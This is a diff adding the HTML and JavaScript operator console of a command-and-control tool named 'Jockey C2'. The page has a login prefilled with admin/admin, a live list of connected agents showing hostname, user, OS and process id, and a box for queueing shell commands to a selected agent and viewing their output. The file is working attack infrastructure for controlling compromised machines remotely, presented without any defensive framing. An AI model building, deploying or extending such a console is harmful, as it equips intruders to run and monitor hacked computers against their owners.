@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Jockey C2 Console</title>
+<style>
+* { box-sizing: border-box; }
+body {
+  margin: 0;
+  font-family: ui-monospace, "JetBrains Mono", Menlo, Consolas, monospace;
+  background: #0d1117;
+  color: #c9d1d9;
+  font-size: 13px;
+}
+#login {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  gap: 12px;
+}
+#login input {
+  padding: 8px 12px;
+  background: #161b22;
+  border: 1px solid #30363d;
+  color: #c9d1d9;
+  border-radius: 4px;
+  width: 240px;
+  font-family: inherit;
+  font-size: inherit;
+}
+#login button {
+  padding: 8px 16px;
+  background: #238636;
+  border: none;
+  color: #fff;
+  border-radius: 4px;
+  cursor: pointer;
+  font-family: inherit;
+  font-size: inherit;
+}
+#login button:hover { background: #2ea043; }
+#app { display: none; height: 100vh; }
+#topbar {
+  padding: 8px 16px;
+  background: #161b22;
+  border-bottom: 1px solid #30363d;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+#topbar .title { font-weight: bold; color: #58a6ff; }
+#topbar button {
+  background: #21262d;
+  border: 1px solid #30363d;
+  color: #c9d1d9;
+  padding: 4px 12px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-family: inherit;
+  font-size: inherit;
+}
+#body { display: flex; height: calc(100vh - 41px); }
+#sidebar {
+  width: 340px;
+  background: #0d1117;
+  border-right: 1px solid #30363d;
+  overflow-y: auto;
+  flex-shrink: 0;
+}
+.agent {
+  padding: 10px 14px;
+  border-bottom: 1px solid #21262d;
+  cursor: pointer;
+}
+.agent:hover { background: #161b22; }
+.agent.active { background: #161b22; border-left: 3px solid #58a6ff; padding-left: 11px; }
+.agent .name { font-weight: bold; }
+.agent .meta { color: #8b949e; font-size: 11px; margin-top: 2px; }
+.agent .dot {
+  display: inline-block;
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  margin-right: 6px;
+  vertical-align: middle;
+}
+.online { background: #3fb950; }
+.offline { background: #6e7681; }
+#main {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+#history {
+  flex: 1;
+  padding: 14px;
+  overflow-y: auto;
+}
+.cmd-block {
+  margin-bottom: 12px;
+  background: #161b22;
+  border: 1px solid #30363d;
+  border-radius: 4px;
+  overflow: hidden;
+}
+.cmd-head {
+  padding: 6px 10px;
+  background: #1f242c;
+  font-size: 11px;
+  color: #8b949e;
+  display: flex;
+  justify-content: space-between;
+}
+.cmd-line {
+  padding: 8px 12px;
+  color: #79c0ff;
+  white-space: pre-wrap;
+  word-break: break-word;
+}
+.out-line {
+  padding: 8px 12px;
+  border-top: 1px solid #21262d;
+  white-space: pre-wrap;
+  word-break: break-word;
+  color: #c9d1d9;
+  font-size: 12px;
+}
+#composer {
+  display: flex;
+  border-top: 1px solid #30363d;
+  background: #161b22;
+}
+#composer input {
+  flex: 1;
+  padding: 10px 14px;
+  background: transparent;
+  border: none;
+  outline: none;
+  color: #c9d1d9;
+  font-family: inherit;
+  font-size: inherit;
+}
+#composer button {
+  padding: 10px 20px;
+  background: #238636;
+  border: none;
+  color: #fff;
+  cursor: pointer;
+  font-family: inherit;
+  font-size: inherit;
+}
+#composer button:hover { background: #2ea043; }
+#empty {
+  text-align: center;
+  padding: 40px;
+  color: #6e7681;
+}
+</style>
+</head>
+<body>
+
+<div id="login">
+  <div class="title" style="color:#58a6ff;font-weight:bold;font-size:18px">JOCKEY C2</div>
+  <input id="login-user" placeholder="user" value="admin">
+  <input id="login-pass" type="password" placeholder="pass" value="admin">
+  <button onclick="doLogin()">Login</button>
+  <div id="login-err" style="color:#f85149"></div>
+</div>
+
+<div id="app">
+  <div id="topbar">
+    <div class="title">JOCKEY C2</div>
+    <button onclick="doLogout()">logout</button>
+  </div>
+  <div id="body">
+    <div id="sidebar"></div>
+    <div id="main">
+      <div id="history"><div id="empty">select an agent</div></div>
+      <div id="composer">
+        <input id="cmd-input" placeholder="command…" onkeydown="if(event.key==='Enter')sendCmd()">
+        <button onclick="sendCmd()">send</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+let SESSION = null;
+let AGENTS = [];
+let ACTIVE = null;
+let POLL_TIMER = null;
+
+async function api(path, opts = {}) {
+  opts.credentials = "same-origin";
+  const r = await fetch(path, opts);
+  if (r.status === 401) { showLogin(); throw new Error("unauth"); }
+  if (r.status === 204) return null;
+  return r.json();
+}
+
+async function doLogin() {
+  const u = document.getElementById("login-user").value;
+  const p = document.getElementById("login-pass").value;
+  const r = await fetch("/api/login", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({user: u, pass: p}),
+    credentials: "same-origin"
+  });
+  if (!r.ok) {
+    document.getElementById("login-err").textContent = "bad creds";
+    return;
+  }
+  showApp();
+}
+
+async function doLogout() {
+  await fetch("/api/logout", {method: "POST", credentials: "same-origin"});
+  showLogin();
+}
+
+function showLogin() {
+  document.getElementById("login").style.display = "flex";
+  document.getElementById("app").style.display = "none";
+  if (POLL_TIMER) clearInterval(POLL_TIMER);
+}
+
+function showApp() {
+  document.getElementById("login").style.display = "none";
+  document.getElementById("app").style.display = "block";
+  refreshAgents();
+  if (POLL_TIMER) clearInterval(POLL_TIMER);
+  POLL_TIMER = setInterval(refreshAgents, 3000);
+}
+
+async function refreshAgents() {
+  try {
+    AGENTS = await api("/api/agents");
+    renderAgents();
+    if (ACTIVE) refreshHistory();
+  } catch (e) {}
+}
+
+function renderAgents() {
+  const sb = document.getElementById("sidebar");
+  if (!AGENTS.length) {
+    sb.innerHTML = '<div style="padding:20px;color:#6e7681;text-align:center">no agents</div>';
+    return;
+  }
+  sb.innerHTML = AGENTS.map(a => `
+    <div class="agent ${a.id===ACTIVE?'active':''}" onclick="selectAgent('${a.id}')">
+      <div class="name">
+        <span class="dot ${a.online?'online':'offline'}"></span>
+        ${esc(a.hostname||a.id)}
+      </div>
+      <div class="meta">${esc(a.user||'?')}@${esc(a.os||'?')} · pid ${a.pid||'?'} · ${a.id.slice(0,8)}</div>
+    </div>
+  `).join("");
+}
+
+function selectAgent(aid) {
+  ACTIVE = aid;
+  renderAgents();
+  refreshHistory();
+}
+
+async function refreshHistory() {
+  if (!ACTIVE) return;
+  const rows = await api(`/api/agents/${ACTIVE}/history`);
+  const h = document.getElementById("history");
+  if (!rows.length) {
+    h.innerHTML = '<div id="empty">no commands yet</div>';
+    return;
+  }
+  h.innerHTML = rows.map(r => `
+    <div class="cmd-block">
+      <div class="cmd-head">
+        <span>#${r.id} · ${fmtTime(r.created)}</span>
+        <span>${r.result_at ? 'done' : (r.dispatched ? 'running…' : 'queued')}</span>
+      </div>
+      <div class="cmd-line">$ ${esc(r.cmd)}</div>
+      ${r.result != null ? `<div class="out-line">${esc(r.result)}</div>` : ''}
+    </div>
+  `).join("");
+  h.scrollTop = h.scrollHeight;
+}
+
+async function sendCmd() {
+  if (!ACTIVE) return;
+  const inp = document.getElementById("cmd-input");
+  const cmd = inp.value.trim();
+  if (!cmd) return;
+  await api(`/api/agents/${ACTIVE}/command`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({cmd})
+  });
+  inp.value = "";
+  setTimeout(refreshHistory, 200);
+}
+
+function esc(s) {
+  return String(s == null ? "" : s)
+    .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+
+function fmtTime(t) {
+  if (!t) return "?";
+  const d = new Date(t*1000);
+  return d.toTimeString().slice(0,8);
+}
+
+// Try to restore session on load
+window.addEventListener("load", async () => {
+  try {
+    await api("/api/agents");
+    showApp();
+  } catch (e) {
+    showLogin();
+  }
+});
+</script>
+
+</body>
+</html>
